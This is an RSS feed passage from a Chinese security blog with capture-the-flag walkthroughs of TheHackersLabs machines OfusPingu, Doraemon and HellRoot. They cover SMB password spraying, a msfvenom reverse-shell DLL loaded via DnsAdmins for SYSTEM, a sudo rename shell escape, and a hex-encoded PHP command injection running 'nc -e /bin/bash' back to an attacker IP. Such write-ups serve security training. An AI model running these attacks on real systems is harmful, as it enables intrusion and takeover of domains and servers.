nano /etc/grub.d/01_password
sudo nano /etc/grub.d/01_password
sudo su
sudo -l
sudo /usr/bin/rename -m
sudo -l
sudo /usr/bin/rename -m
```

查看 `sudo` 权限

```bash
debian@OfusPingu:~$ sudo -l
Matching Defaults entries for debian on OfusPingu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User debian may run the following commands on OfusPingu:
    (ALL) NOPASSWD: /usr/bin/rename
```

结束了，跟着`.bash_history` 敲 `sudo /usr/bin/rename -m` 会进入帮助

![image.png](/post-images/TheHackersLabsOfusPingu/image5.png)

然后可以输入`esc` + `!/bin/bash` 即可切换到 `root shell` ，这里类似于使用 `less` 或者 `more`等来提权

![image.png](/post-images/TheHackersLabsOfusPingu/image6.png)

读取 `root.txt`

```bash
root@OfusPingu:~# cat root.txt 
D99xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```]]></content:encoded>
            <category>靶机</category>
            <category>TheHackersLabs</category>
            <category>Linux</category>
            <category>API</category>
            <category>rename</category>
            <category>hydra</category>
        </item>
        <item>
            <title><![CDATA[TheHackersLabs - Doraemon]]></title>
            <link>https://www.sunsetaction.top/2025/08/03/TheHackersLabsDoraemon</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/08/03/TheHackersLabsDoraemon</guid>
            <pubDate>Sun, 03 Aug 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Doraemon https://labs.thehackerslabs.com/machine/30 Recon PortScan 枚举 SMB 匿名 有两个文件夹有读的权限，通过模块全部读出来 得到一个 txt 文件，内容： 致：埃斯特波纳铜锣烧1特别组 哆啦A梦：嘿，伙计们！今天我们去吃铜锣烧...]]></description>
            <content:encoded><![CDATA[
# Doraemon

> https://labs.thehackerslabs.com/machine/30
> 

![image.png](/post-images/TheHackersLabsDoraemon/image.png)

## Recon

### PortScan

```scheme
➜  Doraemon nmap -sn 192.168.10.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-03 10:52 CST
Nmap scan report for 192.168.10.1
Host is up (0.00057s latency).
MAC Address: 0A:00:27:00:00:10 (Unknown)
Nmap scan report for 192.168.10.5
Host is up (0.00081s latency).
MAC Address: 08:00:27:09:13:BA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.10.7
Host is up (0.00050s latency).
MAC Address: 08:00:27:34:2C:FD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.10.100
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.26 seconds
```

```scheme
➜  Doraemon nmap -sT -min-rate 10000 -p- 192.168.10.5
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-03 10:53 CST
Warning: 192.168.10.5 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.10.5
Host is up (0.00038s latency).
Not shown: 64597 closed tcp ports (conn-refused), 913 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49673/tcp open  unknown
49676/tcp open  unknown
49687/tcp open  unknown
49705/tcp open  unknown
MAC Address: 08:00:27:09:13:BA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

```scheme
➜  Doraemon nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 192.168.10.5
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-03 10:53 CST
Nmap scan report for 192.168.10.5
Host is up (0.00049s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-08-03 08:53:47Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: DORAEMON.THL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Datacenter 14393 microsoft-ds (workgroup: DORAEMON)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: DORAEMON.THL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
MAC Address: 08:00:27:09:13:BA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 2016|2019
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2019
OS details: Microsoft Windows Server 2016 or Server 2019
Network Distance: 1 hop
Service Info: Host: WIN-VRU3GG3DPLJ; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery:
|   OS: Windows Server 2016 Datacenter 14393 (Windows Server 2016 Datacenter 6.3)
|   Computer name: WIN-VRU3GG3DPLJ
|   NetBIOS computer name: WIN-VRU3GG3DPLJ\x00
|   Domain name: DORAEMON.THL
|   Forest name: DORAEMON.THL
|   FQDN: WIN-VRU3GG3DPLJ.DORAEMON.THL
|_  System time: 2025-08-03T10:53:48+02:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_nbstat: NetBIOS name: WIN-VRU3GG3DPLJ, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:09:13:ba (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-08-03T08:53:48
|_  start_date: 2025-08-03T08:25:53
|_clock-skew: mean: 5h19m54s, deviation: 1h09m16s, median: 5h59m54s

TRACEROUTE
HOP RTT     ADDRESS
1   0.49 ms 192.168.10.5

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.86 seconds
```

### 枚举

`SMB` 匿名

```scheme
➜  Doraemon nxc smb 192.168.10.5 -u anonymous -p '' --smb-timeout 9999 --shares         
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:DORAEMON.THL) (signing:True) (SMBv1:True) 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\anonymous: (Guest)
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [*] Enumerated shares
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  Share           Permissions     Remark
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  -----           -----------     ------
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  ADMIN$                          Admin remota
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  C$                              Recurso predeterminado
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  gorrocoptero    READ            
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  IPC$            READ            IPC remota
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  NETLOGON                        Recurso compartido del servidor de inicio de sesión 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  SYSVOL                          Recurso compartido del servidor de inicio de sesión 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  Users
```

有两个文件夹有读的权限，通过模块全部读出来

```scheme
nxc smb 192.168.10.5 -u anonymous -p '' --smb-timeout 9999 -M spider_plus -o DOWNOAD_FLAG=True
```

![image.png](/post-images/TheHackersLabsDoraemon/image1.png)

得到一个 `txt` 文件，内容：

```scheme
➜  gorrocoptero cat kedadawapa.txt       
Atención al grupo especial Dorayaki1 de Estepona

- Doraemon: Â¡Hola, chicos! Â¿QuÃ© les parece si vamos a comer dorayakis hoy?

- Nobita: Â¡SÃ­! Â¡Me encantan los dorayakis! Peroâ€¦ Â¿dÃ³nde vamos a conseguirlos?

- Shizuka: He oÃ­do que hay una nueva tienda de dorayakis en la esquina de la calle. Â¡Dicen que son los mejores de la ciudad!

- Suneo: Oh, por favor. Siempre hay algo nuevo. No puedo esperar para probarlos. Â¡Espero que sean mÃ¡s grandes que los de la tienda anterior!

- Gigante: Â¡Quiero que sean enormes! Â¡Y que tengan mucho relleno! Si no, Â¡no me importa ir!

- Doraemon: Bueno, podemos pedirle a Nobita que use el poder de la mÃ¡quina de tiempo para viajar al futuro y traernos unos dorayakis del aÃ±o 3000.

- Nobita: Â¡Espera! No sÃ© si deberÃ­a usar la mÃ¡quina. La Ãºltima vez que lo hice, terminÃ© en un lugar lleno de robots rarosâ€¦

- Shizuka: No te preocupes, Nobita. Solo vamos a la tienda. No necesitamos ir al futuro. Â¡Podemos ir a pie!

- Suneo: Eso suena aburrido. Â¿Por quÃ© no hacemos una carrera? El primero en llegar a la tienda puede elegir el sabor de los dorayakis.

- Gigante: Â¡Me encanta esa idea! Pero, Â¡tendrÃ¡s que correr rÃ¡pido para ganarme, Suneo!

- Doraemon: Â¿Y si mejor vamos todos juntos? AsÃ­ disfrutamos del camino. AdemÃ¡s, Â¡puedo usar el futurÃ³fono para pedir un montÃ³n de dorayakis para que nos estÃ©n esperando!

- Nobita: Â¡Esa es una gran idea, Doraemon! AsÃ­ no tengo que correr y me aseguro de que haya suficiente para todos.

- Shizuka: Â¡Perfecto! Entonces, Â¡vamos a la tienda de dorayakis!

- Suneo: Â¡SÃ­! Â¡Dorayakis, allÃ¡ vamos!

- Gigante: Â¡No se olviden de mÃ­! Â¡Voy a ganar!

- Doraemon: Â¡A comer dorayakis!
```

> 致：埃斯特波纳铜锣烧1特别组
> 
> 
> 哆啦A梦：嘿，伙计们！今天我们去吃铜锣烧怎么样？
> 
> 大雄：好啊！我超爱吃铜锣烧！可是……我们去哪儿买呢？
> 
> 静香：我听说街角开了一家新的铜锣烧店。据说是城里最好吃的！
> 
> 小夫：拜托。总是有新东西。我迫不及待想尝尝。希望比上一家的更大！
> 
> 巨人：我想要个大号的！而且要多馅儿！如果不是，我也可以去！
> 
> 哆啦A梦：好吧，我们可以请大雄用时光机的力量，穿越到未来，给我们带一些3000年的铜锣烧。
> 
> 大雄：等等！我不知道该不该用这台机器。上次我用的时候，结果把我带到了一个满是奇怪机器人的地方……
> 
> 静香：别担心，大雄。我们只是去商店而已。我们不用去未来。我们可以步行！
> 
> 小夫：听起来很无聊。不如我们来个比赛？第一个到店的人可以选择铜锣烧的口味。
> 
> 巨人：我喜欢这个主意！不过你得跑得快才能赢我，小夫！
> 
> 哆啦A梦：我们一起去怎么样？这样我们就能享受旅程了。而且，我可以用未来手机订一堆等着我们的铜锣烧！
> 
> 大雄：这主意太棒了，哆啦A梦！这样我就不用跑了，还能确保每个人都有足够的铜锣烧。
> 
> 静香：太好了！那我们去铜锣烧店吧！
> 
> 小夫：好的！铜锣烧，来啦！
> 
> 巨人：别忘了我！我要赢！
> 
> ——哆啦A梦：我们吃铜锣烧吧！
> 

## 横向移动

### Timeroast ❌

```scheme
➜  Timeroast python timeroast.py 192.168.10.5
1000:$sntp-ms$6f6ee79d5defec4040b0f1bf4a84779e$1c0111e900000000000a0cff4c4f434cec399b9ba4dee858e1b8428bffbfcd0aec39acbe8d0ff10eec39acbe8d100f41
```

`hash` 保存为 `hash.txt` , `hashcat` 爆破

```scheme
./hashcat.bin -m 31300 hash.txt /usr/share/wordlists/rockyou.txt 
```

没爆破出来

### 域用户名枚举

可能前面的是用户名，我们将其提取出来

```scheme
➜  gorrocoptero cat kedadawapa.txt | awk -F '- ' '{print $2}' |awk -F ':' '{print $1}'| sort | uniq | tee Domain_users.txt

Doraemon
Gigante
Nobita
Shizuka
Suneo
```

我们再对用户名进行测试

```scheme
➜  Doraemon nxc smb 192.168.10.5 -u Domain_users.txt -p '' --smb-timeout 9999 --continue-on-success --loggedon-users
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:DORAEMON.THL) (signing:True) (SMBv1:True) 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\: 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\Doraemon: STATUS_LOGON_FAILURE 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\Gigante: STATUS_LOGON_FAILURE 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\Nobita: STATUS_LOGON_FAILURE 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\Shizuka: STATUS_LOGON_FAILURE 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\Suneo: STATUS_LOGON_FAILURE
```

提示 `STATUS_LOGON_FAILURE` 存在用户名，但是密码错了

### **Kerberoast ❌**

再枚举 `Kerberoast`

```scheme
➜  Doraemon GetNPUsers.py -dc-ip 192.168.10.5 doraemon.thl/ -usersfile Domain_users.txt              
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] invalid principal syntax
/root/.local/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] User Doraemon doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Gigante doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Nobita doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Shizuka doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Suneo doesn't have UF_DONT_REQUIRE_PREAUTH set
```

没法子，这里看了一下 `WP`，发现 txt 文件中的 `Dorayaki1` 是一个有效密码

### 密码喷洒

我们进行密码喷洒

```scheme
➜  Doraemon nxc smb 192.168.10.5 -u Domain_users.txt -p 'Dorayaki1' --smb-timeout 9999 --continue-on-success                 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:DORAEMON.THL) (signing:True) (SMBv1:True) 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\:Dorayaki1 (Guest)
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\Doraemon:Dorayaki1 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\Gigante:Dorayaki1 STATUS_LOGON_FAILURE 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\Nobita:Dorayaki1 STATUS_LOGON_FAILURE 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\Shizuka:Dorayaki1 STATUS_LOGON_FAILURE 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\Suneo:Dorayaki1 STATUS_LOGON_FAILURE
```

得到用户 `Doraemon` 的凭据

测试凭据

```scheme
➜  Doraemon nxc ldap 192.168.10.5 -u 'Doraemon' -p 'Dorayaki1'                           
LDAP        192.168.10.5    389    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-VRU3GG3DPLJ) (domain:DORAEMON.THL)
LDAP        192.168.10.5    389    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\Doraemon:Dorayaki1 

➜  Doraemon nxc winrm 192.168.10.5 -u 'Doraemon' -p 'Dorayaki1'
WINRM       192.168.10.5    5985   WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-VRU3GG3DPLJ) (domain:DORAEMON.THL)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.10.5    5985   WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\Doraemon:Dorayaki1 (Pwn3d!)
```

### 域分析

使用 `bloodhound-ce-python` 进行信息收集

```scheme
➜  Doraemon bloodhound-ce-python -u 'Doraemon' -p 'Dorayaki1' -d 'DORAEMON.THL' -ns 192.168.10.5 -dc 'WIN-VRU3GG3DPLJ.DORAEMON.THL' --zip -c All
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: doraemon.thl
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: WIN-VRU3GG3DPLJ.DORAEMON.THL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: WIN-VRU3GG3DPLJ.DORAEMON.THL
INFO: Found 10 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: WIN-VRU3GG3DPLJ.DORAEMON.THL
INFO: Done in 00M 01S
INFO: Compressing output into 20250803115152_bloodhound.zip
```

域用户组信息

![image.png](/post-images/TheHackersLabsDoraemon/image2.png)

在 `Bloodhound` 中没能找到什么可利用信息

上 `winpeas` 能找到一个奇怪的文本文件

![image.png](/post-images/TheHackersLabsDoraemon/image3.png)

是一个凭据

```scheme
*Evil-WinRM* PS C:\> cat 'C:\Users\Doraemon\Links\Carta de amor a Shizuka.txt'
Shizuka te doy la clave de mi corazon: ShizukaTeAmobb12345
```

密码喷洒

```scheme
➜  Doraemon nxc smb 192.168.10.5 -u Domain_users.txt -p 'ShizukaTeAmobb12345' --continue-on-success  
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:DORAEMON.THL) (signing:True) (SMBv1:True) 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\:ShizukaTeAmobb12345 (Guest)
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\Doraemon:ShizukaTeAmobb12345 STATUS_LOGON_FAILURE 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\Gigante:ShizukaTeAmobb12345 STATUS_LOGON_FAILURE 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\Nobita:ShizukaTeAmobb12345 STATUS_LOGON_FAILURE 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\Shizuka:ShizukaTeAmobb12345 STATUS_LOGON_FAILURE 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\Suneo:ShizukaTeAmobb12345
```

是 `suneo` 的凭据，属于 `DNSADMINS` 和 `DORAYAKI` 组

![image.png](/post-images/TheHackersLabsDoraemon/image4.png)

通过 `BloodyAD` 查看可写，有很多

![image.png](/post-images/TheHackersLabsDoraemon/image5.png)

## 权限提升

在 `HackTricks` 中能找到利用方法：https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html?highlight=DNSadmins#dnsadmins

**DnsAdmins** 组的成员可以利用其权限在 DNS 服务器（通常托管在域控制器上）上加载具有 SYSTEM 权限的任意 `DLL`

生成反弹 `shell` DLL

```scheme
➜  Doraemon msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.10.100 LPORT=4444 -f dll -o OMG.dll                                                                                  
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of dll file: 9216 bytes
Saved as: OMG.dll
```

使用以下命令使 `DNS` 服务器加载任意 `DLL`

```scheme
*Evil-WinRM* PS C:\tools> dnscmd WIN-VRU3GG3DPLJ.DORAEMON.THL /config /serverlevelplugindll c:\tools\OMG.dll

Propiedad del Registro serverlevelplugindll restablecida correctamente.
Comando completado correctamente.
```

然后重启服务

```scheme
sc.exe \\WIN-VRU3GG3DPLJ stop dns
sc.exe \\WIN-VRU3GG3DPLJ start dns
```

![image.png](/post-images/TheHackersLabsDoraemon/image6.png)

读取 `root.txt` 和 `user.txt`

```powershell
C:\Users\Administrador\Desktop>type root.txt
type root.txt
advcrxxxxxxxxxxxxxxxxxxxxxxxxxx

C:\Users\Suneo\Desktop>type user.txt
type user.txt
asfrexxxxxxxxxxxxxxxxxxx

C:\Users\Administrador\Desktop>whoami
whoami
nt authority\system
```

## 总结

还行，就一开始的密码没猜到]]></content:encoded>
            <category>靶机</category>
            <category>TheHackersLabs</category>
            <category>Windows</category>
            <category>DNSADmins</category>
            <category>SMB</category>
            <category>CVE-2021-40469</category>
        </item>
        <item>
            <title><![CDATA[TheHackersLabs - HellRoot]]></title>
            <link>https://www.sunsetaction.top/2025/08/02/TheHackersLabsHellRoot</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/08/02/TheHackersLabsHellRoot</guid>
            <pubDate>Sat, 02 Aug 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[HellRoot https://labs.thehackerslabs.com/machine/121 Recon PortScan 扫描出来有两个 SSH 服务，三个 Web 枚举 192.168.56.5 是 Apache 的默认页面 https://git.hellroot.thl/ 是 G...]]></description>
            <content:encoded><![CDATA[
# HellRoot

> https://labs.thehackerslabs.com/machine/121
> 

![image.png](/post-images/TheHackersLabsHellRoot/image.png)

## Recon

### PortScan

```bash
➜  HellRoot nmap -sT -min-rate 10000 -p- 192.168.56.95
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-30 15:08 CST
Nmap scan report for 192.168.56.95
Host is up (0.00052s latency).
Not shown: 65530 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
222/tcp  open  rsh-spx
443/tcp  open  https
5000/tcp open  upnp
MAC Address: 08:00:27:5E:A1:66 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 3.73 seconds
```

```bash
➜  HellRoot nmap -sT -A -p 22,80,222,443,5000 192.168.56.95
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-30 15:09 CST
Nmap scan report for 192.168.56.95
Host is up (0.00076s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey:
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)
|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)
80/tcp   open  http     Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Apache2 Debian Default Page: It works
222/tcp  open  ssh      OpenSSH 10.0 (protocol 2.0)
443/tcp  open  ssl/http nginx 1.29.0
| ssl-cert: Subject: commonName=git.hellroot.thl
| Not valid before: 2025-07-17T18:18:57
|_Not valid after:  2026-07-17T18:18:57
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|   http/1.1
|   http/1.0
|_  http/0.9
|_http-server-header: nginx/1.29.0
|_http-title: Did not follow redirect to https://git.hellroot.thl/
5000/tcp open  http     Apache httpd
|_http-server-header: Apache
|_http-title: Domain Lookup Service
MAC Address: 08:00:27:5E:A1:66 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.76 ms 192.168.56.95
```

扫描出来有两个 `SSH` 服务，三个 `Web`

### 枚举

`192.168.56.5` 是 `Apache` 的默认页面

![image.png](/post-images/TheHackersLabsHellRoot/image1.png)

`https://git.hellroot.thl/` 是 `Gitea`

![image.png](/post-images/TheHackersLabsHellRoot/image2.png)

`http://git.hellroot.thl:5000/` 是域名解析一样的东西

![image.png](/post-images/TheHackersLabsHellRoot/image3.png)

测试了一下这个功能，貌似是使用 `dig` 来做域名解析，不过我这里使用仅主机所以无法进行解析

![image.png](/post-images/TheHackersLabsHellRoot/image4.png)

这里我也尝试了命令拼接，经过简单尝试没有哪里可以进行注入

来到 `gitea` 能找到一个项目

![image.png](/post-images/TheHackersLabsHellRoot/image5.png)

将压缩包下载下来打开，是 `5000` 端口的源码

有三个文件

![image.png](/post-images/TheHackersLabsHellRoot/image6.png)

在 `Dockerfile` 里面能发现一个用户密码，但是这里使用 `SSH` 无法进行登录

```bash
# Create user astro with passwordless sudo access only for /bin/su
RUN useradd -m astro && echo "astro:iloveastro" | chpasswd && \
    echo "astro ALL=(ALL:ALL) NOPASSWD: /bin/su" > /etc/sudoers.d/astro-su && \
    chmod 440 /etc/sudoers.d/astro-su
```

并且 `222` 端口只能使用私钥进行登录

## RCE 漏洞

下边是`index.php` 的源码

```bash
<main>
  <h1>Domain Lookup Service</h1>
  <form method="POST" action="">
    <label for="domain">Enter Domain</label>
    <input id="domain" name="domain" type="text" placeholder="example.com" required autocomplete="off" />
    <button type="submit">Lookup DNS</button>
  </form>

<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['domain'])) {
    $input = trim($_POST['domain']);
    $decoded = @hex2bin($input);

    // Always show raw output for debugging
    ob_start();

    if ($decoded !== false && ctype_print($decoded)) {
        if (strpos($decoded, ';') !== false) {
            // Remove header modification that breaks execution
            $output = shell_exec($decoded . ' 2>&1');
        } else {
            $safeDomain = escapeshellarg($decoded);
            $output = shell_exec("nslookup $safeDomain 2>&1");
        }
    } else {
        $safeDomain = escapeshellarg($input);
        $output = shell_exec("nslookup $safeDomain 2>&1");
    }

    echo '<pre class="result">' . htmlspecialchars($output ?: 'No output returned.') . '</pre>';
    ob_end_flush();
}
?>
```

很明显存在一个`RCE` 漏洞

这里接收我们的参数 `domain` ，然后对其进行`16`进制编码

```bash
$input = trim($_POST['domain']);
$decoded = @hex2bin($input);
```

然后下边判断解码是否成功，和是否为可以打印字符

假如我们直接输入字符则进入 `else`

```bash
   if ($decoded !== false && ctype_print($decoded)) {
        if (strpos($decoded, ';') !== false) {
            // Remove header modification that breaks execution
            $output = shell_exec($decoded . ' 2>&1');
        } else {
            $safeDomain = escapeshellarg($decoded);
            $output = shell_exec("nslookup $safeDomain 2>&1");
        }
    } else {
		    // 字符直接进入这里
        $safeDomain = escapeshellarg($input);
        $output = shell_exec("nslookup $safeDomain 2>&1");
    }
```

假如我们输入`16`进制，并且解码成功就会进入

```bash
if (strpos($decoded, ';') !== false) {
            // Remove header modification that breaks execution
            $output = shell_exec($decoded . ' 2>&1');
        } else {
            $safeDomain = escapeshellarg($decoded);
            $output = shell_exec("nslookup $safeDomain 2>&1");
        }
```

`$output = shell_exec($decoded . ' 2>&1');` ，如果找到了分号，代码会直接将解码后的、未经任何处理的字符串 `$decoded` 传递给 `shell_exec` 函数执行

我们尝试 `google.com;nc 192.168.56.5 80` ，然后转换为 `16` 进制

![image.png](/post-images/TheHackersLabsHellRoot/image7.png)

参数填入 `domian` 参数后成功执行

![image.png](/post-images/TheHackersLabsHellRoot/image8.png)

进行反弹 `shell`

```bash
google.com;nc 192.168.56.5 1234 -e /bin/bash
// To hex
676f6f676c652e636f6d3b6e63203139322e3136382e35362e352031323334202d65202f62696e2f62617368
```

![image.png](/post-images/TheHackersLabsHellRoot/image9.png)

## 网络嗅探

当前我们在 `Docker` 环境里面

```bash
www-data@05cc10128c04:/home$ ls -la /
total 64
drwxr-xr-x   1 root root 4096 Jul 19 12:49 .
drwxr-xr-x   1 root root 4096 Jul 19 12:49 ..
-rwxr-xr-x   1 root root    0 Jul 19 12:49 .dockerenv
```

找到一个文本文件

```bash
www-data@05cc10128c04:/var/www/html$ cat sniff.txt 
Puede que haya ciertas herramientas que te permitan esnifar el trafico.
```

> 可能存在某些工具可以让你嗅探流量。
> 

隐藏的 `.config` 文件夹

```bash
www-data@05cc10128c04:/var/www/html/.config$
```

里面有 `dpkg` 的信息，能看到有 `tcpdump`

![image.png](/post-images/TheHackersLabsHellRoot/image10.png)

使用上面的得到的凭据切换用户

```bash
www-data@05cc10128c04:/home$ su astro 
Password: 
$ id
